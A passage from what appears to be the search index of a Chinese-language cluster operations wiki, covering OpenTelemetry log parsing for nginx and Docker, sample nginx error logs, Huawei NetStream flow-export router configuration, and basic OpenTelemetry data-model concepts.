parse_from: attributes[\"severity\"]\n        # nginx error level: debug, info, notice, warn, error, crit, alert, or emerg\n        overwrite_text: true\n        mapping:\n        FATAL: emerg\n        ERROR3: alert\n        ERROR2: crit\n        ERROR: error\n        WARN: warn\n        INFO2: notice\n        INFO: info\n        DEBUG: debug\n    - type: remove\n    field: attributes[\"timestamp\"]\n    - type: remove\n    field: attributes[\"severity\"]\n    - type: move\n    from: attributes[\"message\"]\n    to: body\n    - type: move\n    from: attributes[\"pid\"]\n    to: resource[\"process.pid\"]\n    - type: move\n    from: attributes[\"tid\"]\n    to: resource[\"thread.id\"]\n    - type: move\n    from: attributes[\"cid\"]\n    to: resource[\"correlation.id\"]\n    if: 'type(attributes[\"cid\"]) != \"nil\"'\n    # kv\n    - type: key_value_parser\n    parse_from: attributes[\"kv\"]\n    parse_to: attributes[\"nginx\"]\n    delimiter: ':'\n    pair_delimiter: ','\n    # kv is always a string even if it is empty, so do not use\n    # type(attributes[\"kv\"]) != \"nil\"\n    if: 'attributes[\"kv\"] != \"\"'\n    - type: remove\n    field: attributes[\"kv\"]\n</code></pre> Nginx \u9519\u8bef\u65e5\u5fd7\u6837\u4f8b <pre><code>2024/10/06 00:16:21 [error] 1285318#1285318: *3020238683 limiting requests, excess: 0.356 by zone \"badreqlimit\", client: 221.11.39.67, server: mirror.zju.edu.cn, request: \"GET /debian-cd/11.6.0/s390x/iso-dvd/debian-11.6.0-s390x-DVD-1.iso HTTP/1.1\", host: \"mirrors.zju.edu.cn\"\n2024/10/06 00:42:49 [error] 1285316#1285316: *3020285623 open() \"/data/storage/direct/favicon.ico\" failed (2: No such file or directory), client: 45.251.240.168, server: mirror.zju.edu.cn, request: \"GET /favicon.ico HTTP/1.0\", host: \"mirrors.zju.edu.cn\"\n2024/10/06 00:42:02 [warn] 1285318#1285318: *3020284230 upstream server temporarily disabled while connecting to upstream, client: 2001:250:4:100::2, server: mirror.zju.edu.cn, request: \"GET /api/mirrorz.json HTTP/1.1\", upstream: \"http://[::1]:6003/mirrorz.json\", host: \"mirrors.zju.edu.cn\"\n2024/10/06 00:42:02 [error] 1285318#1285318: *3020284230 connect() failed (111: Connection refused) while connecting to upstream, client: 2001:250:4:100::2, server: mirror.zju.edu.cn, request: \"GET /api/mirrorz.json HTTP/1.1\", upstream: \"http://[::1]:6003/mirrorz.json\", host: \"mirrors.zju.edu.cn\"\n2024/10/06 00:29:03 [alert] 1285318#1285318: *3020261617 could not allocate new session in SSL session shared cache \"MozSSL\" while SSL handshaking, client: 2409:8934:9e08:62d3::1, server: [::]:443\n2024/10/06 00:07:16 [crit] 1285318#1285318: *3020215598 SSL_do_handshake() failed (SSL: error:141CF06C:SSL routines:tls_parse_ctos_key_share:bad key share) while SSL handshaking, client: 49.7.224.233, server: 0.0.0.0:443\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/log/#docker","title":"Docker","text":"<p>Quote</p> <ul> <li>Introducing the new container log parser for OpenTelemetry Collector - OpenTelemetry</li> <li>JSON File logging driver - Docker Docs</li> </ul> <p>Docker \u5bb9\u5668\u53ef\u4ee5\u6307\u5b9a Log Driver\uff0c\u9ed8\u8ba4\u4e3a <code>json-file</code>\uff0c\u5b58\u50a8\u4e8e <code>/var/lib/docker/containers/&lt;container-id&gt;/&lt;container-id&gt;-json.log</code>\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6bcf\u884c\u5185\u5bb9\u4ec5\u6709 <code>log</code>\u3001<code>stream</code>\u3001<code>time</code> \u4e09\u4e2a\u5b57\u6bb5\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e <code>log-opts</code> \u6765\u6dfb\u52a0\u989d\u5916\u5b57\u6bb5\u3002\u9700\u8981\u6dfb\u52a0\u7684\u989d\u5916\u5b57\u6bb5\u8003\u8651\u548c <code>dockerstatsreceiver</code> \u7684\u9ed8\u8ba4\u542f\u7528\u5b57\u6bb5\u5bf9\u9f50\uff0c\u4ee5\u4fbf\u5c06 Log \u548c Metric \u5173\u8054\u8d77\u6765\u3002</p> <ul> <li><code>container.hostname</code></li> <li><code>container.id</code></li> <li><code>container.image.name</code></li> <li><code>container.name</code></li> <li><code>container.runtime</code></li> </ul> /etc/docker/daemon.json<pre><code>{\n  \"log-opts\": {\n    \"tag\": \"container.name={{.Name}} container.id={{.ID}} container.image.name={{.ImageName}} container.runtime={{.DaemonName}}\"\n    }\n}\n</code></pre> <p>\u6ce8\u610f\u4fee\u6539 <code>daemon.json</code> \u540e\uff0c<code>log-opts</code> \u4ec5\u5bf9\u65b0\u521b\u5efa\u7684\u5bb9\u5668\u751f\u6548\uff0c\u5df2\u7ecf\u521b\u5efa\u7684\u5bb9\u5668\u9700\u8981\u91cd\u5efa\u3002</p> <p>\u4fee\u6539\u540e\u7684\u65e5\u5fd7\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>{\n  \"log\": \"[2024-10-14 12:58:52.07328] [33867] [info] Worker 33867 started\\n\",\n  \"stream\": \"stderr\",\n  \"attrs\": {\n    \"tag\": \"container.name=lanraragi container.id=3a6d0edc99f29a114a93dfe31a71cb4322cbb7a9b4dd9655dc8aecef2b8248e4 container.image.name=docker.io/difegue/lanraragi container.runtime=docker\"\n  },\n  \"time\": \"2024-10-14T12:58:52.073349989Z\"\n}\n</code></pre> <p>\u4f7f\u7528 <code>filelogreceiver</code> \u642d\u914d <code>container</code> operator \u53ef\u4ee5\u5b8c\u6210\u5bb9\u5668\u65e5\u5fd7\u7684\u6536\u96c6\u3002</p> <pre><code>filelog/docker:\n  include: /var/lib/docker/containers/*/*-json.log\n  start_at: beginning\n  operators:\n    - type: container\n      format: docker\n      add_metadata_from_filepath: false\n    - type: key_value_parser\n      parse_from: attributes.attrs.tag\n      parse_to: resource\n      if: 'type(attributes.attrs) != \"nil\"'\n    - type: remove\n      field: attributes.attrs\n      if: 'type(attributes.attrs) != \"nil\"'\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/network/","title":"\u7f51\u7edc\u89c2\u6d4b","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/observability/network/#\u7f51\u7edc\u89c2\u6d4b","title":"\u7f51\u7edc\u89c2\u6d4b","text":"<p>Quote</p> <ul> <li>Network Traffic Monitoring in 2024: Discover the Top 7 Solutions</li> <li>\u534e\u4e3a\u6587\u6863</li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/network/#\u7f51\u7edc\u6d41\u5206\u6790network-flow-analysis","title":"\u7f51\u7edc\u6d41\u5206\u6790\uff08Network Flow Analysis\uff09","text":"<p>Quote</p> <ul> <li>Network Flow Monitoring Explained: NetFlow vs sFlow vs IPFIX\uff1a\u5bf9 NetFlow, sFlow, IPFIX \u4e09\u79cd\u6d41\u91cf\u76d1\u63a7\u534f\u8bae\u7684\u4ecb\u7ecd\u3002</li> <li>\u914d\u7f6e IPv4 \u539f\u59cb\u6d41\u7edf\u8ba1\u4fe1\u606f\u7684\u8f93\u51fa\u793a\u4f8b - NetEngine AR600, AR6100, AR6200, AR6300 V300R024 \u914d\u7f6e\u6307\u5357 - \u7f51\u7edc\u7ba1\u7406\u4e0e\u76d1\u63a7\uff08\u547d\u4ee4\u884c\uff09 - \u534e\u4e3a</li> </ul> <p>\u56db\u79cd\u534f\u8bae\u7684\u5173\u7cfb\uff1a</p> <ul> <li>NetFlow\uff1aCisco \u5f00\u53d1\u7684\u6d41\u91cf\u76d1\u63a7\u534f\u8bae\u3002\u76f8\u5173\u884d\u751f\u534f\u8bae\u4e00\u822c\u517c\u5bb9\uff1a<ul> <li>NetStream\uff1aHuawei \u57fa\u4e8e NetFlow v9 \u5f00\u53d1\u7684\u6d41\u91cf\u76d1\u63a7\u534f\u8bae\u3002</li> </ul> </li> <li>sFlow\uff1asampled flow\uff0c\u4e0e NetFlow \u4e0d\u517c\u5bb9\u3002</li> <li>IPFIX\uff1a\u7531 IETF \u4ece NetFlow v9 \u6807\u51c6\u5316\u800c\u6765\u3002</li> </ul> <p>\u4e0b\u6587\u5c06\u4ee5 NetStream \u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/network/#netstream-\u57fa\u672c\u539f\u7406","title":"NetStream \u57fa\u672c\u539f\u7406","text":"<p>\u4e09\u90e8\u5206\uff1a</p> <ul> <li>\u7f51\u7edc\u6d41\u6570\u636e\u8f93\u51fa\u5668 NDE\uff08NetStream Data Exporter\uff09\uff1a\u914d\u7f6e\u4e86 NetStream \u529f\u80fd\u7684\u8bbe\u5907\u5728 NetStream \u7cfb\u7edf\u4e2d\u62c5\u5f53 NDE \u89d2\u8272\u3002</li> <li>\u7f51\u7edc\u6d41\u6570\u636e\u6536\u96c6\u5668 NSC\uff08NetStream Collector\uff09\uff1a\u8fd0\u884c\u4e8e Unix \u6216\u8005 Windows \u4e0a\u7684\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\uff0c\u8d1f\u8d23\u89e3\u6790\u6765\u81ea NDE \u7684\u62a5\u6587\u3002</li> <li>\u7f51\u7edc\u6d41\u6570\u636e\u5206\u6790\u5668 NDA\uff08NetStream Data Analyzer\uff09\uff1a\u4ece NSC \u4e2d\u63d0\u53d6\u7edf\u8ba1\u6570\u636e\uff0c\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u52a0\u5de5\u5904\u7406\u540e\u751f\u6210\u62a5\u8868\u3002</li> </ul> <p>\u5f53\u6d41\u91cf\u8fdb\u5165 NDE \u540e\uff0c\u7ecf\u5386\u4e0b\u5217\u8fc7\u7a0b\uff1a</p> <ul> <li>\u8bbe\u5907\u7684 NetStream \u6a21\u5757\u6309\u4e00\u5b9a\u7684\u91c7\u6837\u65b9\u5f0f\u8fdb\u884c NetStream \u91c7\u6837\uff1a\u968f\u673a/\u56fa\u5b9a\u62a5\u6587\u95f4\u9694\u91c7\u6837\u3001\u968f\u673a/\u56fa\u5b9a\u65f6\u95f4\u95f4\u9694\u91c7\u6837</li> <li>\u5bf9\u91c7\u6837\u6570\u636e\u5efa\u7acb NetStream \u6d41\uff1aNetStream \u662f\u4e00\u9879\u57fa\u4e8e\u201c\u6d41\u201d\u6765\u63d0\u4f9b\u62a5\u6587\u7edf\u8ba1\u7684\u6280\u672f\uff0cNetStream \u6d41\u5c31\u662f IP \u62a5\u6587\uff08UDP\u3001TCP\u3001ICMP \u62a5\u6587\uff09\u3002\u5bf9\u4e8e IPv4 \u62a5\u6587\uff0cIPv4 NetStream \u4f1a\u6839\u636e IPv4 \u62a5\u6587\u7684\u76ee\u7684 IP \u5730\u5740\u3001\u6e90 IP \u5730\u5740\u3001\u76ee\u7684\u7aef\u53e3\u53f7\u3001\u6e90\u7aef\u53e3\u53f7\u3001\u534f\u8bae\u53f7\u3001\u670d\u52a1\u7c7b\u578b ToS\uff08Type of Service\uff09\u3001\u8f93\u5165\u63a5\u53e3\u6216\u8f93\u51fa\u63a5\u53e3\u6765\u5b9a\u4e49\u6d41\uff0c\u76f8\u540c\u7684\u4e03\u5143\u7ec4\u6807\u8bc6\u4e3a\u540c\u4e00\u6761\u6d41\u3002</li> <li>\u6309\u4e00\u5b9a\u7684\u8001\u5316\u65b9\u5f0f\u5bf9\u6d41\u8fdb\u884c NetStream \u6d41\u8001\u5316\u5904\u7406\uff1a<ul> <li>\u6309\u65f6\u8001\u5316\uff1a\u6d3b\u8dc3\u6d41 30 \u5206\u949f\uff0c\u975e\u6d3b\u8dc3\u6d41 30 \u79d2</li> <li>\u7531 TCP \u8fde\u63a5\u7684 FIN \u548c RST \u62a5\u6587\u89e6\u53d1\u8001\u5316</li> <li>\u7edf\u8ba1\u5b57\u8282\u8d85\u8fc7\u9650\u5236\u65f6\u8001\u5316\uff1a\u786c\u4ef6\u7684\u5b57\u8282\u8ba1\u6570\u5668\u662f 32 \u6bd4\u7279\uff0c\u6700\u5927\u8ba1\u6570\u503c\u4e3a 4294967295\uff0c\u7ea6\u4e3a 3.9G \u5b57\u8282</li> <li>\u5f3a\u5236\u8001\u5316</li> </ul> </li> <li>\u6309\u4e00\u5b9a\u7684\u8f93\u51fa\u65b9\u5f0f\u4ee5\u53ca\u76f8\u5e94\u7684\u7248\u672c\u8fdb\u884c NetStream \u6d41\u8f93\u51fa\uff1a<ul> <li>\u539f\u59cb\u6d41\u8f93\u51fa\u662f\u6307\u6240\u6709\u6d41\u7684\u7edf\u8ba1\u4fe1\u606f\u90fd\u8981\u88ab\u7edf\u8ba1\u3002\u5728\u6d41\u8001\u5316\u65f6\u95f4\u8d85\u65f6\u540e\uff0c\u6bcf\u6761\u6d41\u7684\u7edf\u8ba1\u4fe1\u606f\u90fd\u8981\u8f93\u51fa\u5230 NetStream \u670d\u52a1\u5668\u3002</li> <li>\u805a\u5408\u6d41\u8f93\u51fa\u662f\u6307\u91c7\u7528\u805a\u5408\u6d41\u8f93\u51fa\u529f\u80fd\u540e\uff0c\u8bbe\u5907\u5bf9\u4e0e\u805a\u5408\u5173\u952e\u9879\u5b8c\u5168\u76f8\u540c\u7684\u6d41\u7edf\u8ba1\u4fe1\u606f\u8fdb\u884c\u6c47\u603b\uff0c\u4ece\u800c\u5f97\u5230\u5bf9\u5e94\u7684\u805a\u5408\u6d41\u7edf\u8ba1\u4fe1\u606f\uff0c\u5e76\u4e14\u5c06\u8be5\u805a\u5408\u7edf\u8ba1\u4fe1\u606f\u53d1\u9001\u5230\u76f8\u5e94\u7684\u63a5\u6536\u805a\u5408\u7edf\u8ba1\u4fe1\u606f\u7684 NetStream \u670d\u52a1\u5668\u3002\u4f8b\u5982\uff1a\u534f\u8bae - \u7aef\u53e3\u805a\u5408\u3001\u76ee\u7684\u524d\u7f00\u805a\u5408\u3002</li> <li>\u5bf9\u4e8e\u7075\u6d3b\u6d41\u8f93\u51fa\uff0c\u5176\u6d41\u7684\u5efa\u7acb\u6761\u4ef6\u662f\u6309\u7167\u81ea\u5b9a\u4e49\u7684\u6761\u4ef6\u8bbe\u7f6e\u3002</li> </ul> </li> </ul> <p>\u4ee5 OpenTelemetry NetFlow Receiver \u4e3a\u4f8b\uff0cNetFlow v9 \u683c\u5f0f\u8f93\u51fa\u5230 ClickHouse \u4e2d\u7684\u6761\u76ee\u5982\u4e0b\uff1a</p> <pre><code>Timestamp:          2025-03-25 04:25:44.920000000\nTimestampTime:      2025-03-25 04:25:44\nTraceId:\nSpanId:\nTraceFlags:         0\nSeverityText:\nSeverityNumber:     0\nServiceName:\nBody:\nResourceSchemaUrl:\nResourceAttributes: {'cloud.region':'zjusct-cluster'}\nScopeSchemaUrl:\nScopeName:          otelcol/netflowreceiver\nScopeVersion:\nScopeAttributes:    {'receiver':'netflow'}\nLogAttributes:      {'destination.address':'10.78.18.247','destination.port':'11349','flow.end':'1742876744920000000','flow.io.bytes':'377','flow.io.packets':'1','flow.sampler_address':'172.25.3.254','flow.sampling_rate':'0','flow.sequence_num':'1','flow.start':'1742876744920000000','flow.time_received':'1742876776236499353','flow.type':'netflow_v9','network.transport':'udp','network.type':'ipv4','source.address':'210.32.148.87','source.port':'29915'}\n</code></pre> <p>\u9009\u62e9\u66f4\u77ed\u7684\u8001\u5316\u65f6\u95f4</p> <p>NetStream \u7a0d\u663e\u4e0d\u8db3\u7684\u5730\u65b9\u5728\u4e8e\uff1a\u65e0\u6cd5\u5b9e\u65f6\u76d1\u63a7\u6d41\u91cf\u3002\u53ea\u6709\u5f53\u6d41\u8001\u5316\u65f6\uff0c\u624d\u4f1a\u5c06\u6d41\u91cf\u6570\u636e\u53d1\u9001\u5230 NetStream \u670d\u52a1\u5668\uff0c\u6839\u636e\u8be5\u7ed3\u679c\u53ea\u80fd\u5f97\u5230\u5e73\u5747\u901f\u7387\u3002\u5982\u679c\u5bf9\u5b9e\u65f6\u6027\u8981\u6c42\u8f83\u9ad8\uff0c\u53ef\u4ee5\u9009\u62e9\u66f4\u77ed\u7684\u8001\u5316\u65f6\u95f4\u3002\u7136\u800c\u7cfb\u7edf\u5bf9\u6700\u77ed\u8001\u5316\u65f6\u95f4\u6709\u9650\u5236\uff0c\u5728 AR6121 \u4e0a\uff0c\u6d3b\u8dc3\u6d41\u6700\u5c0f\u8001\u5316\u65f6\u95f4 1 \u5206\u949f\uff0c\u975e\u6d3b\u8dc3\u6d41\u6700\u5c0f\u8001\u5316\u65f6\u95f4 1 \u79d2\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/network/#netstream-\u914d\u7f6e","title":"NetStream \u914d\u7f6e","text":"<p>\u76ee\u524d OpenTelemetry NetFlow Receiver \u6682\u65f6\u53ea\u652f\u6301\u534e\u4e3a\u8def\u7531\u5668\u4e2d\u539f\u59cb\u6d41\u7edf\u8ba1\u4fe1\u606f\u7684\u8f93\u51fa\uff0c\u4f7f\u7528\u534f\u8bae - \u7aef\u53e3\u805a\u5408\u7b49\u805a\u5408\u8f93\u51fa\u4f1a\u5bfc\u81f4 IP \u5730\u5740\u5b57\u6bb5\u65e0\u6cd5\u8bc6\u522b\u7b49\u95ee\u9898\u3002</p> <p>\u5728\u9700\u8981\u76d1\u63a7\u7684\u63a5\u53e3\u4e0a\u4f7f\u80fd\u7edf\u8ba1\u3002\u9ed8\u8ba4\u56fa\u5b9a\u62a5\u6587\u95f4\u9694\u91c7\u6837\uff081:100\uff09\uff0c\u6211\u4eec\u9009\u62e9\u5168\u91cf\u91c7\u6837\uff1a</p> <pre><code>[Router] interface gigabitethernet 1/0/0\n[Router-GigabitEthernet1/0/0] ip netstream sampler fix-packets 1 inbound\n[Router-GigabitEthernet1/0/0] ip netstream sampler fix-packets 1 outbound\n[Router-GigabitEthernet1/0/0] ip netstream inbound\n[Router-GigabitEthernet1/0/0] ip netstream outbound\n</code></pre> <p>\u5728\u5168\u5c40\u89c6\u56fe\u4e0b\u4f7f\u80fd\u539f\u59cb\u6d41\u7edf\u8ba1\u4fe1\u606f\u7684\u8f93\u51fa\uff1a</p> <pre><code>[Router] ip netstream tcp-flag enable\n[Router] ip netstream export version 9\n# \u914d\u7f6e\u5b8c\u4e0b\u9762\u4e24\u884c\u5373\u53ef\u5728 OpenTelemetry NetFlow Receiver \u4e2d\u67e5\u770b\u5230\u6d41\u91cf\u6570\u636e\n[Router] ip netstream export source 10.1.2.1\n[Router] ip netstream export host 10.1.2.2 6000\n</code></pre>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/","title":"\u6570\u636e\u91c7\u96c6\uff1aOpenTelemetry","text":"","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#\u6570\u636e\u91c7\u96c6opentelemetry","title":"\u6570\u636e\u91c7\u96c6\uff1aOpenTelemetry","text":"<p>OpenTelemetry \u7684\u7f29\u5199\u4e3a OTel\u3002</p> <p>OpenTelemetry \u7b80\u4ecb\u89c1 \u53ef\u89c2\u6d4b\u6027#OpenTelemetry\u3002</p> <p>OpenTelemetry \u7684\u4e3b\u8981\u90e8\u5206\u5982\u4e0b\uff1a</p> <ul> <li>OTel \u89c4\u8303\uff1a\u6d89\u53ca OpenTelemetry \u7684\u6240\u6709\u90e8\u5206\u3002</li> <li>OTel \u534f\u8bae\uff08OpenTelemetry Protocol\uff0cOTLP\uff09\uff1a\u63cf\u8ff0\u9065\u6d4b\u6570\u636e\u5728\u6570\u636e\u6e90\u3001\u4e2d\u95f4\u8282\u70b9\u548c\u540e\u7aef\u4e4b\u95f4\u7684\u7f16\u7801\u548c\u4f20\u8f93\u65b9\u5f0f\u3002</li> <li>\u8bed\u4e49\u7ea6\u5b9a\uff08Semantic Conventions\uff09\uff1a\u5b9a\u4e49\u5404\u7c7b\u9065\u6d4b\u6570\u636e\u7684\u5c5e\u6027\u540d\u3001\u7c7b\u578b\u3001\u610f\u4e49\u548c\u6709\u6548\u503c\u3002</li> <li>API\uff1a\u5982\u4f55\u751f\u6210\u9065\u6d4b\u6570\u636e\u3002</li> <li>SDK\uff1a\u5728\u7279\u5b9a\u8bed\u8a00\u4e2d\u5b9e\u73b0 API\uff0c\u5bfc\u51fa\u9065\u6d4b\u6570\u636e\u3002</li> <li>\u6536\u96c6\u5668\uff08OpenTelemetry Collector\uff0cotelcol\uff09\uff1a\u63a5\u6536\u3001\u5904\u7406\u548c\u5bfc\u51fa\u9065\u6d4b\u6570\u636e\u3002</li> </ul> <p>\u5173\u4e8e API \u548c SDK \u7684\u533a\u5206</p> <p>API \u5305\u62ec\u62bd\u8c61\u7c7b\uff0c\u7528\u4e8e\u5e93\u5f00\u53d1\u8005\u3002SDK \u5177\u4f53\u5b9e\u73b0\u4e86 API\uff0c\u7528\u4e8e\u5e94\u7528\u5f00\u53d1\u8005\u3002</p> <p>OTel \u8bbe\u8ba1\u5982\u6b64\uff0c\u662f\u4e3a\u4e86\u8ba9\u5e94\u7528\u5f00\u53d1\u8005\u80fd\u591f\u66ff\u6362\u4e0d\u540c SDK \u5b9e\u73b0\u3002OpenTelemetry SDK \u662f\u5b98\u65b9\u7684\u5b9e\u73b0\uff0c\u4f46\u5176\u4ed6\u4eba\u4e5f\u53ef\u4ee5\u6309 API \u5b9e\u73b0\u81ea\u5df1\u7684 SDK\u3002</p>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#otel-\u89c4\u8303\u57fa\u672c\u6982\u5ff5","title":"OTel \u89c4\u8303\uff1a\u57fa\u672c\u6982\u5ff5","text":"<p>\u8981\u70b9\u5982\u4e0b\uff1a</p> <ul> <li> <p>\u5c5e\u6027\uff08Attributes\uff09\u662f KV \u5bf9\uff0cV \u8981\u4e48\u662f\u539f\u59cb\u7c7b\u578b\uff08\u5b57\u7b26\u4e32\u3001\u6574\u6570\u3001\u6d6e\u70b9\u6570\u7b49\uff09\uff0c\u8981\u4e48\u662f\u6570\u7ec4\uff08\u7c7b\u578b\u76f8\u540c\uff09\u3002</p> <ul> <li> <p>\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff0cLog \u6570\u636e\u6a21\u578b\u5728\u6807\u51c6\u4e4b\u5916\u8fdb\u884c\u4e86\u6269\u5145\uff0c\u5141\u8bb8\u4e86\u503c\u4e3a <code>any</code>\uff0c\u8fd9\u662f\u4e3a\u4e86\u652f\u6301\u5916\u90e8\u65e5\u5fd7\u683c\u5f0f\u3002</p> <p>Arbitrary deep nesting of values for arrays and maps is allowed (essentially allows to represent an equivalent of a JSON object).</p> <p>\u9664\u4e86 <code>LogRecord</code> \u7684 <code>Attributes</code>\uff0c\u5176\u4ed6\u5730\u65b9\u90fd\u5e94\u5f53\u9075\u5b88\u6807\u51c6\u7684\u5c5e\u6027\u5b9a\u4e49\u3002</p> </li> </ul> </li> <li> <p>\u5c5e\u6027\u540d\u7531 OTel \u8bed\u4e49\u7ea6\u5b9a \u7ea6\u5b9a\uff1a</p> <ul> <li>\u5e94\u5f53\u662f\u5c0f\u5199\u7684\u3002</li> <li>\u4f7f\u7528\u547d\u540d\u7a7a\u95f4\u907f\u514d\u540d\u5b57\u51b2\u7a81\uff0c\u4f7f\u7528 <code>.</code> \u5206\u9694\u547d\u540d\u7a7a\u95f4\u3002</li> </ul> </li> </ul> <p>Note</p> <p>\u8fd9\u610f\u5473\u7740 OpenTelemetry \u7684\u5c5e\u6027\u662f\u6241\u5e73\u7684\uff0c\u4e0d\u652f\u6301\u5d4c\u5957\u3002\u6bd4\u5982\uff0c\u4e00\u4e2a\u952e\u4e3a <code>foo.bar</code> \u7684\u5c5e\u6027\u5e94\u5f53\u662f\uff1a</p> <pre><code>{\n    \"foo.bar\": \"value\"\n}\n</code></pre> <p>\u800c\u4e0d\u662f</p> <pre><code>{\n    \"foo\": {\n        \"bar\": \"value\"\n    }\n}\n</code></pre> <p>\u6241\u5e73\u7684\u5c5e\u6027\u7ed3\u6784\u5728\u5b9e\u8df5\u65f6\u6709\u51e0\u4e2a\u597d\u5904\uff1a</p> <ul> <li>\u4fbf\u4e8e\u6570\u636e\u5e93\u68c0\u7d22\uff1a\u6bd4\u5982\u5728 ClickHouse \u4e2d\u5b58\u50a8\u4e3a <code>map(LowCardinality(String), String)</code>\uff0c\u5982\u679c\u5d4c\u5957\uff0c\u5219\u9700\u8981\u5bf9\u5b50\u5b57\u7b26\u4e32\u518d\u6b21\u8fdb\u884c\u89e3\u6790\uff0c\u65e0\u6cd5\u7b80\u5355\u5730\u770b\u5230\u5c5e\u6027\u6574\u4f53\u3002</li> <li>\u4fbf\u4e8e OTel \u5904\u7406\uff1a\u6bd4\u5982\u8981\u68c0\u67e5\u4e00\u4e2a\u5c5e\u6027\u662f\u5426\u5b58\u5728\u7684 stanza \u8868\u8fbe\u5f0f\u4e3a <code>type(attributes[\"foo.bar\"]) != 'nil'</code>\u3002\u5982\u679c\u5d4c\u5957\uff0c\u9700\u8981\u5148\u68c0\u67e5 <code>attributes.foo</code> \u662f\u5426\u5b58\u5728\uff0c\u518d\u68c0\u67e5 <code>attributes.foo.bar</code> \u662f\u5426\u5b58\u5728\uff0c\u5426\u5219\u62a5\u9519\u6307\u9488\u5f02\u5e38\u3002</li> </ul> <ul> <li> <p>\u8d44\u6e90\uff08Resource\uff09\u662f\u4e00\u7ec4\u4e0d\u53d8\uff08immutable\uff09\u7684\u5c5e\u6027\uff0c\u7528\u4e8e\u63cf\u8ff0\u4ea7\u751f\u6570\u636e\u7684\u5b9e\u4f53\u3002</p> <p>A Resource is an immutable representation of the entity producing telemetry as Attributes.</p> <p>--  opentelemetry-specification/specification/resource/sdk.md at v1.37.0 \u00b7 open-telemetry/opentelemetry-specification</p> <p>\u76ee\u524d OpenTelemetry \u5b9a\u4e49\u7684\u8d44\u6e90\u4e2d\uff0c\u6211\u4eec\u5173\u5fc3\u7684\u5982\u4e0b\uff1a</p> <ul> <li>\u670d\u52a1 <code>service</code>\uff1a\u4e00\u822c\u6307\u4e00\u4e2a\u7279\u5b9a\u7684\u5e94\u7528\u7a0b\u5e8f\uff0c\u5927\u90e8\u5206\u9700\u8981\u5728\u6536\u96c6\u65f6\u624b\u52a8\u6dfb\u52a0\u3002<ul> <li><code>service.name</code>\uff1a\u670d\u52a1\u540d\u3002</li> <li><code>service.version</code>\uff1a\u670d\u52a1\u7248\u672c\u3002</li> </ul> </li> <li>\u8ba1\u7b97\u5355\u5143\uff1a<ul> <li>\u5bb9\u5668 <code>container</code>\uff1a\u5728 metric \u4e2d\u7531 <code>docker_status</code> receiver \u81ea\u52a8\u6dfb\u52a0\uff0c\u5728 log \u4e2d\u9700\u8981\u624b\u52a8\u89e3\u6790\u3002</li> <li>\u8fdb\u7a0b <code>process</code></li> </ul> </li> </ul> </li> </ul>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#otel-\u8bed\u4e49\u7ea6\u5b9a","title":"OTel \u8bed\u4e49\u7ea6\u5b9a","text":"<p>\u8bed\u4e49\u7ea6\u5b9a\u89c4\u8303\u4e86\u5404\u7c7b\u6570\u636e\u7684\u5c5e\u6027\u540d\u3001\u7c7b\u578b\u3001\u610f\u4e49\u548c\u6709\u6548\u503c\uff0c\u4e3a\u4e0d\u540c\u7cfb\u7edf\u4e4b\u95f4\u7684\u6570\u636e\u4ea4\u6362\u5efa\u7acb\u8d77\u4e00\u5957\u6807\u51c6\u3002OpenTelemetry \u5185\u90e8\u5404\u7ec4\u4ef6\u90fd\u9075\u5b88\u8fd9\u4e9b\u8bed\u4e49\u7ea6\u5b9a\uff0c\u5916\u90e8\u7cfb\u7edf\u4e5f\u5f88\u5bb9\u6613\u5c06\u81ea\u5df1\u7684\u6570\u636e\u6620\u5c04\u5230\u8fd9\u4e9b\u7ea6\u5b9a\u4e0a\u3002\u6b64\u5916\uff0c\u8d8a\u6765\u8d8a\u591a\u7684\u7cfb\u7edf\u5f00\u59cb\u63d0\u4f9b\u8bed\u4e49\u7ea6\u5b9a\u7684\u76f4\u63a5\u652f\u6301\u3002</p> <p>Example</p> <p>\u7f51\u7edc\u76f8\u5173\u7684\u5c5e\u6027\u540d\u79f0\u5b9a\u4e49\u5728 <code>semconv/attributes-registry/network</code> \u4e0b\u3002\u5176\u4e2d\u5bf9\u7aef IP \u7684\u5b9a\u4e49\u5982\u4e0b\uff1a</p> \u5c5e\u6027\u540d \u7c7b\u578b \u63cf\u8ff0 \u793a\u4f8b <code>network.peer.address</code> string Peer address of the network connection - IP address or Unix domain socket name. <code>10.1.2.80</code>; <code>/tmp/my.sock</code>","tags":["\u5b8c\u5584"]},{"location":"operation/observability/opentelemetry/#otel-\u89c4\u8303\u65e5\u5fd7\u548c\u6307\u6807\u7684\u6570\u636e\u6a21\u578b","title":"OTel \u89c4\u8303\uff1a\u65e5\u5fd7\u548c\u6307\u6807\u7684\u6570\u636e\u6a21\u578b","text":"<p>OpenTelemetry \u6570\u636e\u6a21\u578b\u5b9a\u4e49\u4e86\u4e09\u5927\u652f\u67f1\u7684\u6570\u636e\u6a21\u578b\u548c\u5305\u542b\u7684\u8bed\u4e49\u7ea6\u5b9a\uff08\u53ea\u6709 Metric \u548c Log \u6709\u660e\u786e\u7684 Data Specification\uff0cTrace \u5728 API Specification 